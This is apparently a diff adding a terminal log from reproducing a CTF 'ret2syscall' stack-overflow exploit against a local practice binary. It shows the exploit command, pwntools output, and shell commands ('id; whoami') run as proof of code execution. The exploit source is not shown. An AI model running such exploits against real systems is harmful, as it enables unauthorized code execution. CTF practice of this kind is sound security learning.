@@ -1,0 +1,15 @@
+复现实验终端记录 | ret2syscall
+命令：python3 ret2syscall_repro/exploit.py（交互阶段发送 id; whoami; echo RET2SYSCALL_EVIDENCE_OK）
+结果：通过（exit=0）
+
+[x] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop'
+[+] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop': pid 26386
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 129B
+[x] Receiving all data: 157B
+[*] Process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop' stopped with exit code 0 (pid 26386)
+[+] Receiving all data: Done (157B)
+uid=1000(xyx) gid=1000(xyx) groups=1000(xyx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
+xyx
+RET2SYSCALL_EVIDENCE_OK
